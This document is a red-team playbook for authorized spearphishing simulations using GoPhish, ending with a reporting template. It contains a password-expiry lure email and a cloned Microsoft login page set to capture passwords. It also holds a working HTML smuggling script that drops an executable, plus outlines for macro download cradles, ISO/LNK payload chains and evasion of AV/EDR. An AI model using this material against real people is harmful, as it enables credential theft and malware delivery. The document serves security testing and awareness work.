# Conducting Spearphishing Simulation Campaign

## API Reference

## Libraries

| Library | Install | Purpose |
|---------|---------|---------|
| requests | `pip install requests` | GoPhish REST API client |
| gophish | `pip install gophish` | Official GoPhish Python SDK |
| jinja2 | `pip install Jinja2` | Email template rendering |

## GoPhish API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/campaigns/` | Launch new phishing campaign |
| GET | `/api/campaigns/{id}/summary` | Campaign results summary |
| GET | `/api/campaigns/{id}/results` | Detailed per-target results |
| POST | `/api/templates/` | Create email template |
| POST | `/api/pages/` | Create credential capture landing page |
| POST | `/api/groups/` | Create target recipient group |

## GoPhish Template Variables

| Variable | Description |
|----------|-------------|
| `{{.FirstName}}` | Target's first name |
| `{{.LastName}}` | Target's last name |
| `{{.Email}}` | Target's email address |
| `{{.Position}}` | Target's job title |
| `{{.From}}` | Sender display name |
| `{{.URL}}` | Tracking/phishing link |

## Campaign Metrics

| Metric | Description | Industry Avg |
|--------|-------------|-------------|
| Open Rate | Percentage who opened email | 30-40% |
| Click Rate | Percentage who clicked link | 10-20% |
| Submit Rate | Percentage who entered data | 5-10% |
| Report Rate | Percentage who reported to IT | 5-15% |

## External References

- [GoPhish User Guide](https://docs.getgophish.com/)
- [GoPhish API Docs](https://docs.getgophish.com/api-documentation/)
- [MITRE T1566.001 Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)

---

## Standards and Controls

## MITRE ATT&CK - Initial Access (TA0001)

| Technique ID | Name | Sub-technique |
|-------------|------|---------------|
| T1566.001 | Spearphishing Attachment | Malicious files delivered via email |
| T1566.002 | Spearphishing Link | URLs in emails directing to malicious content |
| T1566.003 | Spearphishing via Service | Phishing through third-party services |
| T1598.001 | Phishing for Information: Spearphishing Service | Info gathering via services |
| T1598.002 | Phishing for Information: Spearphishing Attachment | Credential harvesting attachments |
| T1598.003 | Phishing for Information: Spearphishing Link | Credential harvesting links |

## MITRE ATT&CK - Execution (TA0002)

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1204.001 | User Execution: Malicious Link | User clicks phishing link |
| T1204.002 | User Execution: Malicious File | User opens malicious attachment |

## MITRE ATT&CK - Resource Development (TA0042)

| Technique ID | Name | Description |
|-------------|------|-------------|
| T1583.001 | Acquire Infrastructure: Domains | Register phishing domains |
| T1583.006 | Acquire Infrastructure: Web Services | Use web services for phishing |
| T1585.001 | Establish Accounts: Social Media | Create fake social media profiles |
| T1585.002 | Establish Accounts: Email Accounts | Create email accounts for sending |
| T1608.001 | Stage Capabilities: Upload Malware | Host payloads for download |
| T1608.005 | Stage Capabilities: Link Target | Prepare phishing URLs |

## PTES - Social Engineering

### Pre-text Creation
- Research-based pretext development
- Authority, urgency, and scarcity principles
- Robert Cialdini's principles of influence
- Corporate communication mimicry

### Attack Vectors
- Email-based spearphishing
- Voice phishing (vishing) support calls
- SMS phishing (smishing)
- Social media-based pretexting

## NIST SP 800-177 - Trustworthy Email

### Email Authentication Protocols
- SPF (Sender Policy Framework)
- DKIM (DomainKeys Identified Mail)
- DMARC (Domain-based Message Authentication)

### Email Security Controls
- Email gateway filtering
- URL rewriting and sandboxing
- Attachment analysis
- Domain reputation scoring

## CIS Controls v8

### Control 14: Security Awareness and Skills Training
- 14.1: Establish and Maintain a Security Awareness Program
- 14.2: Train Workforce Members to Recognize Social Engineering Attacks
- 14.3: Train Workforce Members on Authentication Best Practices

## Email Security Bypass Techniques Reference

| Technique | Bypasses | Risk Level |
|-----------|----------|------------|
| HTML Smuggling | Email attachment scanning | High |
| Domain Age/Reputation | New domain blocking | Medium |
| Legitimate Service Abuse | Domain reputation filters | High |
| SPF/DKIM/DMARC Alignment | Email authentication checks | Medium |
| File Format Alternatives | Attachment type blocking | Medium |
| QR Code Phishing | URL analysis engines | High |

---

## Workflows

## Workflow 1: GoPhish Campaign Setup

### Step 1: Install and Configure GoPhish
```bash
# Download GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
cd /opt/gophish

# Generate SSL certificate for admin panel
openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt

# Edit config.json
# Set admin_server listen_url to 0.0.0.0:3333
# Set phish_server listen_url to 0.0.0.0:443

# Start GoPhish
./gophish
```

### Step 2: Configure Sending Profile
```
Name: Red Team SMTP
SMTP From: it-support@targetcorp-helpdesk.com
Host: mail.phishing-infra.com:587
Username: operator@phishing-infra.com
Password: [SECURE_PASSWORD]
Ignore Certificate Errors: No
Headers:
  X-Mailer: Microsoft Outlook 16.0
  Reply-To: it-support@targetcorp-helpdesk.com
```

### Step 3: Create Email Template
```html
Subject: [ACTION REQUIRED] Password Expiry Notice - {{.FirstName}}

Dear {{.FirstName}} {{.LastName}},

Your corporate password will expire in 24 hours. To maintain
access to company resources, please update your password
immediately using our secure portal.

<a href="{{.URL}}">Update Password Now</a>

This is an automated message from IT Security.
Please complete this action before {{.BaseRecipient}} loses access.

Best regards,
IT Security Team
{{.Tracker}}
```

### Step 4: Create Landing Page
```
Import Site: https://login.microsoftonline.com
Capture Submitted Data: Yes
Capture Passwords: Yes
Redirect To: https://portal.office.com (after credential capture)
```

### Step 5: Configure Target Group
```
Import from CSV:
First Name, Last Name, Email, Position
John,Smith,john.smith@targetcorp.com,IT Manager
Jane,Doe,jane.doe@targetcorp.com,HR Director
```

### Step 6: Launch Campaign
```
Name: RT-2024-001 Password Expiry
Email Template: Password Expiry Notice
Landing Page: O365 Login Clone
Sending Profile: Red Team SMTP
Groups: Target Group Alpha
Launch Date: [SCHEDULED_DATE]
Send Emails By: [STAGGER_OVER_4_HOURS]
```

## Workflow 2: Infrastructure Preparation

### Step 1: Domain Selection and Registration
```bash
# Research similar-looking domains (typosquatting)
# targetcorp.com -> targetcorp-it.com, targetc0rp.com, targetcorp.co

# Domain categorization check
# Use tools like Bluecoat/Symantec Site Review to check categorization
# Uncategorized domains may be blocked

# Register domain through privacy-protected registrar
# Age domain for minimum 2 weeks before use
```

### Step 2: Email Authentication Setup
```bash
# SPF Record
# Type: TXT
# Host: @
# Value: v=spf1 ip4:<MAIL_SERVER_IP> include:_spf.google.com ~all

# DKIM Setup
opendkim-genkey -s default -d phishing-domain.com
# Add TXT record: default._domainkey.phishing-domain.com
# Value: v=DKIM1; k=rsa; p=<PUBLIC_KEY>

# DMARC Record
# Type: TXT
# Host: _dmarc
# Value: v=DMARC1; p=none; rsp=100; adkim=s; aspf=s
```

### Step 3: SSL Certificate Setup
```bash
# Using Let's Encrypt for legitimate SSL
certbot certonly --standalone -d phishing-domain.com
certbot certonly --standalone -d login.phishing-domain.com

# Configure certificates in GoPhish/web server
```

## Workflow 3: Payload Development

### HTML Smuggling Payload
```html
<!-- HTML Smuggling - bypasses email gateway scanning -->
<html>
<body>
<script>
// Base64 encoded payload
var payload = "TVqQAAMAAAAEAAAA..."; // Encoded executable
var binary = atob(payload);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: "application/octet-stream"});
var link = document.createElement("a");
link.href = URL.createObjectURL(blob);
link.download = "Update_Required.exe";
link.click();
</script>
<p>Your document is downloading. If the download does not start,
<a href="#" id="manual-download">click here</a>.</p>
</body>
</html>
```

### Macro-Enabled Document Workflow
```
1. Create legitimate-looking document template
2. Add VBA macro for payload execution:
   - AutoOpen() or Document_Open() trigger
   - Download cradle using PowerShell or certutil
   - Execute payload from %TEMP% directory
3. Test against target's known AV/EDR solution
4. Obfuscate macro code to bypass static analysis
```

### ISO/LNK Payload Chain
```
1. Create ISO file containing:
   - Legitimate-looking LNK shortcut
   - Hidden DLL or executable payload
   - Decoy document for user satisfaction
2. LNK file executes hidden payload via:
   - rundll32.exe to load DLL
   - mshta.exe to execute HTA
   - PowerShell download cradle
3. ISO bypasses Mark-of-the-Web (MotW) on older Windows
```

## Workflow 4: Campaign Execution and Monitoring

### Pre-Launch Checklist
```
- [ ] Domain aged and categorized
- [ ] SPF/DKIM/DMARC configured
- [ ] SSL certificates installed
- [ ] Email templates tested for rendering
- [ ] Landing pages functional and capturing data
- [ ] Payload tested against target's security stack
- [ ] C2 callback verified
- [ ] Tracking pixels loading correctly
- [ ] Target list finalized and imported
- [ ] Campaign schedule confirmed with engagement lead
```

### Launch Procedure
```
1. Send initial test email to red team operator
2. Verify delivery, rendering, and link tracking
3. Launch Wave 1: High-priority targets (5-10 users)
4. Monitor for 1 hour - check delivery and open rates
5. Verify no immediate blocks or quarantine
6. Launch Wave 2: Remaining targets (staggered over 2-4 hours)
7. Monitor dashboard continuously for first 4 hours
8. Check for credential captures and payload executions
9. Document all interactions with timestamps
```

### Real-Time Monitoring
```
Track and document:
- Email delivery success/failure rates
- Email open rates (tracking pixel)
- Link click rates
- Credential submission events
- Payload download events
- Callback/beacon events
- User reports to SOC
- Time between delivery and interaction
```

## Workflow 5: Post-Campaign Reporting

### Metrics Calculation
```
Delivery Rate = (Emails Delivered / Emails Sent) x 100
Open Rate = (Unique Opens / Emails Delivered) x 100
Click Rate = (Unique Clicks / Emails Delivered) x 100
Credential Capture Rate = (Credentials Captured / Emails Delivered) x 100
Payload Execution Rate = (Payloads Executed / Emails Delivered) x 100
Report Rate = (Users Who Reported / Emails Delivered) x 100
```

### Evidence Collection
```
For each successful interaction:
1. Screenshot of GoPhish dashboard showing the event
2. Captured credentials (hash, not plaintext in report)
3. C2 beacon screenshot showing initial callback
4. Timeline of events from delivery to compromise
5. Email headers showing delivery path
```

---

## Working Template

## Document Control

| Field | Value |
|-------|-------|
| Campaign ID | [ID] |
| Engagement ID | [ENGAGEMENT_ID] |
| Target Organization | [NAME] |
| Campaign Date | [START] - [END] |
| Red Team Lead | [NAME] |
| Classification | CONFIDENTIAL |

---

## 1. Executive Summary

[Overview of campaign objectives, methodology, and key findings]

**Bottom Line:** [X]% of targeted users clicked the phishing link, and [Y]% submitted credentials, demonstrating [assessment of organizational risk].

---

## 2. Campaign Details

### 2.1 Pretext
- **Theme:** [Password expiry / Shared document / HR benefits / etc.]
- **Authority Figure:** [IT Security / HR / Executive / Vendor]
- **Urgency Level:** [High / Medium / Low]
- **Personalization Level:** [Name, role, department, etc.]

### 2.2 Infrastructure
| Component | Details |
|-----------|---------|
| Sending Domain | [DOMAIN] |
| Domain Age | [DAYS] days |
| SPF/DKIM/DMARC | [Configured / Partial / None] |
| Landing Page URL | [URL] |
| SSL Certificate | [Let's Encrypt / Self-signed] |

### 2.3 Payload
- **Type:** [Link / Attachment / QR Code]
- **Payload:** [Credential harvester / HTML smuggling / Macro document]
- **C2 Callback:** [C2 DOMAIN/IP]

---

## 3. Target Summary

| Department | Targets | Clicked | Submitted | Reported |
|-----------|---------|---------|-----------|----------|
| | | | | |
| **Total** | | | | |

---

## 4. Campaign Metrics

| Metric | Value | Industry Benchmark |
|--------|-------|--------------------|
| Delivery Rate | % | 95%+ |
| Open Rate | % | 30-40% |
| Click-Through Rate | % | 10-15% |
| Credential Capture Rate | % | 5-10% |
| Phishing Report Rate | % | 20-30% |
| Time to First Click | min | <5 min typical |
| Time to First Report | min | <30 min ideal |

---

## 5. Timeline of Events

| Time (UTC) | Event | User | Details |
|-----------|-------|------|---------|
| | Campaign launched | N/A | Wave 1 sent |
| | First email opened | [USER] | Tracking pixel loaded |
| | First link click | [USER] | Landing page accessed |
| | First credential submission | [USER] | Credentials captured |
| | First SOC report | [USER] | Phishing reported |
| | Campaign concluded | N/A | All waves completed |

---

## 6. Security Control Assessment

### 6.1 Email Security Gateway
| Control | Status | Notes |
|---------|--------|-------|
| SPF Validation | Passed/Blocked | |
| DKIM Validation | Passed/Blocked | |
| DMARC Enforcement | Passed/Blocked | |
| URL Rewriting | Active/Bypassed | |
| Attachment Scanning | Active/Bypassed | |
| Sandboxing | Active/Bypassed | |

### 6.2 Endpoint Protection
| Control | Status | Notes |
|---------|--------|-------|
| Browser URL Filtering | Blocked/Bypassed | |
| EDR Detection | Detected/Missed | |
| Credential Guard | Active/Bypassed | |

### 6.3 User Awareness
| Indicator | Assessment |
|-----------|-----------|
| Recognition of phishing indicators | Low/Medium/High |
| Use of phishing report button | Low/Medium/High |
| Resistance to urgency pressure | Low/Medium/High |
| Verification of sender identity | Low/Medium/High |

---

## 7. Risk Assessment

### 7.1 Impact Analysis
If this were a real attack:
- **[X] credentials** would provide initial access to corporate systems
- **[Y] users** would have unknowingly executed malicious payloads
- **Estimated dwell time** before detection: [Z hours/days]

### 7.2 Risk Rating
**Overall Risk: [CRITICAL/HIGH/MEDIUM/LOW]**

---

## 8. Recommendations

### Immediate (0-30 days)
1. [Recommendation]
2. [Recommendation]

### Short-Term (30-90 days)
1. [Recommendation]
2. [Recommendation]

### Long-Term (90+ days)
1. [Recommendation]
2. [Recommendation]

---

## 9. MITRE ATT&CK Mapping

| Technique ID | Name | Status |
|-------------|------|--------|
| T1566.002 | Spearphishing Link | Successful/Blocked |
| T1204.001 | User Execution: Malicious Link | Successful/Blocked |
| T1078 | Valid Accounts | Credentials Captured/None |

---

## Appendix A: Email Template Used

[Include screenshot or text of phishing email]

## Appendix B: Landing Page Screenshot

[Include screenshot of credential harvesting page]

## Appendix C: Users Who Clicked (Redacted)

| # | Department | Role Level | Action Taken |
|---|-----------|------------|-------------|
| 1 | | | Clicked/Submitted/Both |

## Appendix D: IOCs for Blue Team

| Type | Value | Description |
|------|-------|-------------|
| Domain | | Phishing domain |
| IP | | Infrastructure IP |
| URL | | Landing page URL |
| Email | | Sender address |
